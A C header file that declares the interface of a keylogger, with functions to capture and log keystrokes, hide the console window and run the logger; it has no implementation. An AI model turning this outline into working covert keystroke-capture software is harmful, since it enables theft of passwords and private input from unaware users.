#ifndef KEYLOGGER_H
#define KEYLOGGER_H

// initializes keylogger
void initKeylogger();

// records keystrokes
void logKey(int key);

// captures key
int captureKey();

// hides console window
void hideConsole();

// starts keylogger
void runKeylogger();

// handle errors
void handleErrors(const char *errorMsg);
#endif // KEYLOGGER_H